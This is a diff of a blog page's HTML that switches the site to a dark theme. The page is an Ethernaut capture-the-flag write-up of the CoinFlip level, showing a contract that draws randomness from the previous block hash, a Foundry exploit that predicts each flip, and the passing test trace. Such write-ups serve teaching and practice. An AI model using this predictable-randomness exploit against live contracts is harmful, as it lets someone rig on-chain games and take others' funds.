@@ -40,13 +40,19 @@
 
   
   
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.1fcaf868e247e0175202d2fe4516e33a7bdb47365e90fe92409b3f14b2036b72.css" integrity="sha256-H8r4aOJH4BdSAtL&#43;RRbjOnvbRzZekP6SQJs/FLIDa3I=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.f457e937e31d731408def5c4e09a8bc48156362889abb942912d05a8243264a6.css" integrity="sha256-9FfpN&#43;MdcxQI3vXE4JqLxIFWNiiJq7lCkS0FqCQyZKY=" crossorigin="anonymous" media="screen" />
 
 
 
 
 
   
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.58002408d8b6590c4b5ea8cc6e50bb088510809eae7e48d72d44762e7e7481af.css" integrity="sha256-WAAkCNi2WQxLXqjMblC7CIUQgJ6ufkjXLUR2Ln50ga8=" crossorigin="anonymous" media="screen" />
+  
+
 
 
    
@@ -77,8 +83,16 @@
 
 
 
-<body class="preload-transitions colorscheme-light">
+
+
+<body class="preload-transitions colorscheme-dark">
   
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
 
   <main class="wrapper">
     <nav class="navigation">
@@ -192,36 +206,36 @@
 <p>To complete this challenge we need to predict the outcome of a
 coin flip game 10 times in a row. Here is the slightly altered
 version of the original smart contract:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">8</span>.<span style="color:#00d;font-weight:bold">2</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> ^<span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">2</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">CoinFlip</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> <span style="color:#080;font-weight:bold">public</span> consecutiveWins;
-</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> lastHash;
-</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> FACTOR =
-</span></span><span style="display:flex;"><span>        <span style="color:#00d;font-weight:bold">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> CoinFlip {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> FACTOR =
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0;font-weight:bold">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>() {
-</span></span><span style="display:flex;"><span>        consecutiveWins = <span style="color:#00d;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>() {
+</span></span><span style="display:flex;"><span>        consecutiveWins = <span style="color:#ff0;font-weight:bold">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">flip</span>(<span style="color:#888;font-weight:bold">bool</span> _guess) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">uint256</span> blockValue = <span style="color:#888;font-weight:bold">uint256</span>(<span style="color:#038">blockhash</span>(<span style="color:#038">block</span>.<span style="color:#038">number</span> - <span style="color:#00d;font-weight:bold">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flip(<span style="color:#fff;font-weight:bold">bool</span> _guess) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> blockValue = <span style="color:#fff;font-weight:bold">uint256</span>(<span style="color:#fff;font-weight:bold">blockhash</span>(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">number</span> - <span style="color:#ff0;font-weight:bold">1</span>));
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> (lastHash == blockValue) {
-</span></span><span style="display:flex;"><span>            <span style="color:#038">revert</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (lastHash == blockValue) {
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">revert</span>();
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        lastHash = blockValue;
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">bool</span> side = coinFlip == <span style="color:#00d;font-weight:bold">1</span> ? <span style="color:#080;font-weight:bold">true</span> : <span style="color:#080;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">bool</span> side = coinFlip == <span style="color:#ff0;font-weight:bold">1</span> ? <span style="color:#fff;font-weight:bold">true</span> : <span style="color:#fff;font-weight:bold">false</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> (side == _guess) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (side == _guess) {
 </span></span><span style="display:flex;"><span>            consecutiveWins++;
-</span></span><span style="display:flex;"><span>            <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
-</span></span><span style="display:flex;"><span>        } <span style="color:#080;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>            consecutiveWins = <span style="color:#00d;font-weight:bold">0</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            consecutiveWins = <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">false</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
@@ -232,16 +246,16 @@ version of the original smart contract:</p>
   </a>
 </h2>
 <p>The <code>CoinFlip</code> contract has 3 state variables:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-weight:bold">uint256</span> <span style="color:#080;font-weight:bold">public</span> consecutiveWins;
-</span></span><span style="display:flex;"><span><span style="color:#888;font-weight:bold">uint256</span> lastHash;
-</span></span><span style="display:flex;"><span><span style="color:#888;font-weight:bold">uint256</span> FACTOR = <span style="color:#00d;font-weight:bold">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> FACTOR = <span style="color:#ff0;font-weight:bold">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
 </span></span></code></pre></div><ul>
 <li><code>consecutiveWins</code> &ndash; Keeps track of a number of consecutive wins :)</li>
 <li><code>lastHash</code> &ndash; Contains an integer representation of the previous block&rsquo;s hash.</li>
 <li><code>FACTOR</code> &ndash; Used in the <code>flip</code> function to calculate coin side.</li>
 </ul>
 <p>Let&rsquo;s examine the <code>flip</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-weight:bold">uint256</span> blockValue = <span style="color:#888;font-weight:bold">uint256</span>(<span style="color:#038">blockhash</span>(<span style="color:#038">block</span>.<span style="color:#038">number</span> - <span style="color:#00d;font-weight:bold">1</span>));
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> blockValue = <span style="color:#fff;font-weight:bold">uint256</span>(<span style="color:#fff;font-weight:bold">blockhash</span>(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">number</span> - <span style="color:#ff0;font-weight:bold">1</span>));
 </span></span></code></pre></div><ul>
 <li>The <code>blockValue</code> local variable is an integer representation of the previous block&rsquo;s hash.</li>
 <li>This function uses <code>block.number</code> as a source of randomness (ha-ha! 😈).</li>
@@ -256,21 +270,21 @@ in hexadecimal. The <code>blockValue</code> divided by this factor gives us 50%
 probability of getting heads or tails.</li>
 </ul>
 <p>This check prevents us from doing two flips in the same block:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">if</span> (lastHash == blockValue) {
-</span></span><span style="display:flex;"><span>    <span style="color:#038">revert</span>();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (lastHash == blockValue) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">revert</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>For the above check to work the <code>lastHash</code> is saved on each <code>flip</code>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>lastHash = blockValue;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>lastHash = blockValue;
 </span></span></code></pre></div><p>The <code>blockValue</code> is divided by <code>FACTOR</code> to determine a coin side:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
-</span></span><span style="display:flex;"><span><span style="color:#888;font-weight:bold">bool</span> side = coinFlip == <span style="color:#00d;font-weight:bold">1</span> ? <span style="color:#080;font-weight:bold">true</span> : <span style="color:#080;font-weight:bold">false</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bool</span> side = coinFlip == <span style="color:#ff0;font-weight:bold">1</span> ? <span style="color:#fff;font-weight:bold">true</span> : <span style="color:#fff;font-weight:bold">false</span>;
 </span></span></code></pre></div><p>The <code>if-else</code> condition increments or resets the <code>consecutiveWins</code>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">if</span> (side == _guess) {
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (side == _guess) {
 </span></span><span style="display:flex;"><span>    consecutiveWins++;
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
-</span></span><span style="display:flex;"><span>} <span style="color:#080;font-weight:bold">else</span> {
-</span></span><span style="display:flex;"><span>    consecutiveWins = <span style="color:#00d;font-weight:bold">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>    consecutiveWins = <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">false</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="exploit">
   Exploit
@@ -280,23 +294,23 @@ probability of getting heads or tails.</li>
 </h2>
 <p>We can have a contract that contains a function, which runs the
 same logic to &ldquo;guess&rdquo; the <code>flip</code> outcome:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
 </span></span><span style="display:flex;"><span>    vm.startPrank(player);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">for</span> (<span style="color:#888;font-weight:bold">uint256</span> i = <span style="color:#00d;font-weight:bold">0</span>; i &lt; <span style="color:#00d;font-weight:bold">10</span>; i++) {
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">uint256</span> blockValue = <span style="color:#888;font-weight:bold">uint256</span>(<span style="color:#038">blockhash</span>(<span style="color:#038">block</span>.<span style="color:#038">number</span> - <span style="color:#00d;font-weight:bold">1</span>));
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-weight:bold">bool</span> side = coinFlip == <span style="color:#00d;font-weight:bold">1</span> ? <span style="color:#080;font-weight:bold">true</span> : <span style="color:#080;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint256</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; <span style="color:#ff0;font-weight:bold">10</span>; i++) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> blockValue = <span style="color:#fff;font-weight:bold">uint256</span>(<span style="color:#fff;font-weight:bold">blockhash</span>(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">number</span> - <span style="color:#ff0;font-weight:bold">1</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> coinFlip = blockValue / FACTOR;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">bool</span> side = coinFlip == <span style="color:#ff0;font-weight:bold">1</span> ? <span style="color:#fff;font-weight:bold">true</span> : <span style="color:#fff;font-weight:bold">false</span>;
 </span></span><span style="display:flex;"><span>        level.flip(side);
-</span></span><span style="display:flex;"><span>        utils.mineBlocks(<span style="color:#00d;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>        utils.mineBlocks(<span style="color:#ff0;font-weight:bold">1</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    vm.stopPrank();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The trace:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>forge <span style="color:#038">test</span> --match-contract CoinFlipTest -vvvv
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>forge <span style="color:#fff;font-weight:bold">test</span> --match-contract CoinFlipTest -vvvv
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running <span style="color:#00d;font-weight:bold">1</span> <span style="color:#038">test</span> <span style="color:#080;font-weight:bold">for</span> src/test/CoinFlip.t.sol:CoinFlipTest
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/CoinFlip.t.sol:CoinFlipTest
 </span></span><span style="display:flex;"><span>[PASS] testCoinFlip() (gas: 342799)
 </span></span><span style="display:flex;"><span>Traces:
 </span></span><span style="display:flex;"><span>  [342799] CoinFlipTest::testCoinFlip()
@@ -305,72 +319,72 @@ same logic to &ldquo;guess&rdquo; the <code>flip</code> outcome:</p>
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   ├─ [199770] Ethernaut::createLevelInstance(CoinFlipFactory: [...])
 </span></span><span style="display:flex;"><span>    │   │   ├─ [148207] CoinFlipFactory::createInstance(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [115659] → new CoinFlip@<span style="color:#d20;background-color:#fff0f0">&#34;0x037f…dd8f&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#00d;font-weight:bold">456</span> bytes of code
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ [115659] → new CoinFlip@<span style="color:#0ff;font-weight:bold">&#34;0x037f…dd8f&#34;</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">456</span> bytes of code
 </span></span><span style="display:flex;"><span>    │   │   │   └─ ← CoinFlip: [...]
 </span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: CoinFlip: [...])
 </span></span><span style="display:flex;"><span>    │   │   └─ ← CoinFlip: [...]
 </span></span><span style="display:flex;"><span>    │   └─ ← CoinFlip: [...]
 </span></span><span style="display:flex;"><span>    ├─ [295] CoinFlip::consecutiveWins() [staticcall]
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#00d;font-weight:bold">0</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#ff0;font-weight:bold">0</span>
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [42978] CoinFlip::flip(<span style="color:#038">false</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [42978] CoinFlip::flip(<span style="color:#fff;font-weight:bold">false</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(2)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(3)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#038">false</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#fff;font-weight:bold">false</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(4)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(5)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(6)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#038">false</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#fff;font-weight:bold">false</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(7)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(8)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(9)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#038">true</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1168] CoinFlip::flip(<span style="color:#fff;font-weight:bold">true</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(10)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#038">false</span>)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    ├─ [1178] CoinFlip::flip(<span style="color:#fff;font-weight:bold">false</span>)
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [733] Utils::mineBlocks(1)
 </span></span><span style="display:flex;"><span>    │   ├─ [0] VM::roll(11)
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
@@ -382,10 +396,10 @@ same logic to &ldquo;guess&rdquo; the <code>flip</code> outcome:</p>
 </span></span><span style="display:flex;"><span>    ├─ [4230] Ethernaut::submitLevelInstance(CoinFlip: [...])
 </span></span><span style="display:flex;"><span>    │   ├─ [1183] CoinFlipFactory::validateInstance(CoinFlip: [...], player: [...])
 </span></span><span style="display:flex;"><span>    │   │   ├─ [295] CoinFlip::consecutiveWins() [staticcall]
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#00d;font-weight:bold">10</span>
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">10</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: CoinFlipFactory: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
 </span></span><span style="display:flex;"><span>    └─ ← ()
@@ -494,7 +508,7 @@ Ethernaut, #5 Telephone</a>!</p>
 
   
   
-  <script src="https://vyorkin.org/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js" integrity="sha256-I2BJOV3DaC&#43;ycZZAhylY4S8fJAZ7sJwyeyM&#43;YpDH7aw="></script>
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
   
 
   
